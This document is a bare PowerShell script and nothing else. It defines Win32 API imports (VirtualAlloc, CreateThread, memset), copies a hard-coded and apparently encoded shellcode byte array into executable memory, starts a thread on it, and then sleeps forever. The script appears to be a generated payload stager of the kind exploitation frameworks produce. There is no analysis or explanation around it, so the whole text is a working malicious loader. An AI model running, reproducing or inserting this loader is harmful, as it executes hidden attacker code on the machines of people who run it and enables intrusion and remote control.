
$yyi = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $yyi -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x64,0xb7,0x23,0x75,0xd9,0xec,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x47,0x31,0x57,0x13,0x83,0xc7,0x04,0x03,0x57,0x6b,0x55,0xd6,0x89,0x9b,0x1b,0x19,0x72,0x5b,0x7c,0x93,0x97,0x6a,0xbc,0xc7,0xdc,0xdc,0x0c,0x83,0xb1,0xd0,0xe7,0xc1,0x21,0x63,0x85,0xcd,0x46,0xc4,0x20,0x28,0x68,0xd5,0x19,0x08,0xeb,0x55,0x60,0x5d,0xcb,0x64,0xab,0x90,0x0a,0xa1,0xd6,0x59,0x5e,0x7a,0x9c,0xcc,0x4f,0x0f,0xe8,0xcc,0xe4,0x43,0xfc,0x54,0x18,0x13,0xff,0x75,0x8f,0x28,0xa6,0x55,0x31,0xfd,0xd2,0xdf,0x29,0xe2,0xdf,0x96,0xc2,0xd0,0x94,0x28,0x03,0x29,0x54,0x86,0x6a,0x86,0xa7,0xd6,0xab,0x20,0x58,0xad,0xc5,0x53,0xe5,0xb6,0x11,0x2e,0x31,0x32,0x82,0x88,0xb2,0xe4,0x6e,0x29,0x16,0x72,0xe4,0x25,0xd3,0xf0,0xa2,0x29,0xe2,0xd5,0xd8,0x55,0x6f,0xd8,0x0e,0xdc,0x2b,0xff,0x8a,0x85,0xe8,0x9e,0x8b,0x63,0x5e,0x9e,0xcc,0xcc,0x3f,0x3a,0x86,0xe0,0x54,0x37,0xc5,0x6c,0x98,0x7a,0xf6,0x6c,0xb6,0x0d,0x85,0x5e,0x19,0xa6,0x01,0xd2,0xd2,0x60,0xd5,0x15,0xc9,0xd5,0x49,0xe8,0xf2,0x25,0x43,0x2e,0xa6,0x75,0xfb,0x87,0xc7,0x1d,0xfb,0x28,0x12,0x8b,0xfe,0xbe,0x5d,0xe4,0x00,0x34,0x36,0xf7,0x02,0x59,0x9a,0x7e,0xe4,0x09,0x72,0xd1,0xb9,0xe9,0x22,0x91,0x69,0x81,0x28,0x1e,0x55,0xb1,0x52,0xf4,0xfe,0x5b,0xbd,0xa1,0x57,0xf3,0x24,0xe8,0x2c,0x62,0xa8,0x26,0x49,0xa4,0x22,0xc5,0xad,0x6a,0xc3,0xa0,0xbd,0x1a,0x23,0xff,0x9c,0x8c,0x3c,0xd5,0x8b,0x30,0xa9,0xd2,0x1d,0x67,0x45,0xd9,0x78,0x4f,0xca,0x22,0xaf,0xc4,0xc3,0xb6,0x10,0xb2,0x2b,0x57,0x91,0x42,0x7a,0x3d,0x91,0x2a,0xda,0x65,0xc2,0x4f,0x25,0xb0,0x76,0xdc,0xb0,0x3b,0x2f,0xb1,0x13,0x54,0xcd,0xec,0x54,0xfb,0x2e,0xdb,0x64,0xc7,0xf8,0x25,0x13,0x29,0x39;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ZvCb=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ZvCb.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ZvCb,0,0,0);for (;;){Start-sleep 60};

